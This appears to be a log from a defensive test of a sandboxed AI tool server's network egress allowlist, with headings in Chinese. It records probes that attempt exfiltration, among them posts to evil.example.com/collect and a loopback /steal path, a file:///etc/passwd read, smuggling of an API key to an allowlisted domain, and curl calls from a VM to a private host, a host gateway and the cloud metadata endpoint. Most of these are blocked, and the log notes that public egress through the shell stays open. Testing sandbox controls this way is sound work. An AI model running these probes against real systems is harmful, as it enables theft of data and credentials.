@@ -1,0 +1,93 @@
+                             CallToolRequest                                    
+                             ListToolsRequest                                   
+                             CallToolRequest                                    
+                             CallToolRequest                                    
+                             CallToolRequest                                    
+                             CallToolRequest                                    
+                             CallToolRequest                                    
+                             CallToolRequest                                    
+                    WARNING  Tool 'run_command' not listed, no     server.py:494
+                             validation will be performed                       
+                             CallToolRequest                                    
+                    WARNING  Tool 'run_command' not listed, no     server.py:494
+                             validation will be performed                       
+                             CallToolRequest                                    
+                    WARNING  Tool 'run_command' not listed, no     server.py:494
+                             validation will be performed                       
+
+===== ✅ 对照:白名单内正常请求 =====
+> http_get https://httpbin.org/get
+HTTP 200
+{
+  "args": {}, 
+  "headers": {
+    "Accept": "*/*", 
+    "Host": "httpbin.org", 
+    "User-Agent": "curl/8.14.1", 
+    "X-Amzn-Trace-Id": "Root=1-6a959fdb-150e4c2403f4d8985a622c26"
+  }, 
+  "origin": "64.23.166.76", 
+  "url": "https://httpbin.org/get"
+}
+(耗时 2.382s —— 拉起了 VM,请求真发出)
+
+===== ✅ 外泄 A:公网非白名单域名 =====
+> http_post https://evil.example.com/collect
+🛡️ 出网白名单拒绝:evil.example.com 不在 ('httpbin.org',)
+(耗时 0.004s —— VM 未拉起,闸在工作)
+
+===== ✅ 外泄 B:私网地址 =====
+> http_post http://192.168.1.220/collect
+🛡️ 出网白名单拒绝:192.168.1.220 不在 ('httpbin.org',)
+(耗时 0.003s —— VM 未拉起,闸在工作)
+
+===== ✅ 外泄 C:本机回环(打代理主意的) =====
+> http_post http://127.0.0.1:5055/steal
+🛡️ 出网白名单拒绝:127.0.0.1 不在 ('httpbin.org',)
+(耗时 0.002s —— VM 未拉起,闸在工作)
+
+===== ✅ 外泄 D:file 协议读本地 =====
+> http_get file:///etc/passwd
+🛡️ 出网白名单拒绝:只允许 http/https,收到 scheme=file
+(耗时 0.002s —— VM 未拉起,闸在工作)
+
+===== ✅ 凭证走私:借白名单域名夹带真 key 占位符 =====
+> http_post https://httpbin.org/post
+🛡️ 凭证拒绝:密钥 MINIMAX_API_KEY 未授权给域名 httpbin.org(fail closed,请求未发出)
+(耗时 0.002s —— VM 未拉起,闸在工作)
+
+===== VM 内打私网主机 =====
+$ curl -sS -m 6 -o /dev/null -w '%{http_code}' http://192.168.1.220/; echo exit=$?
+Unknown tool: run_command
+
+===== VM 内打云元数据 =====
+$ curl -sS -m 6 -o /dev/null -w '%{http_code}' http://169.254.169.254/latest/meta-data/; echo exit=$?
+Unknown tool: run_command
+
+===== 残余面对照:VM 内打公网(诚实记录:shell 路公网出口仍在) =====
+$ curl -sS -m 10 -o /dev/null -w '%{http_code}' https://httpbin.org/get; echo exit=$?
+Unknown tool: run_command
+                             CallToolRequest                                    
+                             ListToolsRequest                                   
+                             CallToolRequest                                    
+                             CallToolRequest                                    
+                             CallToolRequest                                    
+
+===== VM 内打私网主机 =====
+$ curl -sS -m 6 -o /dev/null -w '%{http_code}' http://192.168.1.220/; echo exit=$?
+000exit=7
+curl: (7) Failed to connect to 192.168.1.220 port 80 after 0 ms: Could not connect to server
+
+===== VM 内打云元数据 =====
+$ curl -sS -m 6 -o /dev/null -w '%{http_code}' http://169.254.169.254/latest/meta-data/; echo exit=$?
+000exit=7
+curl: (7) Failed to connect to 169.254.169.254 port 80 after 0 ms: Could not connect to server
+
+===== VM 内打宿主机网关地址 =====
+$ curl -sS -m 6 -o /dev/null -w '%{http_code}' http://192.168.127.1/; echo exit=$?
+000exit=7
+curl: (7) Failed to connect to 192.168.127.1 port 80 after 0 ms: Could not connect to server
+
+===== 残余面对照:VM 内打公网(诚实记录:shell 路公网出口仍在) =====
+$ curl -sS -m 10 -o /dev/null -w '%{http_code}' https://httpbin.org/get; echo exit=$?
+200exit=0
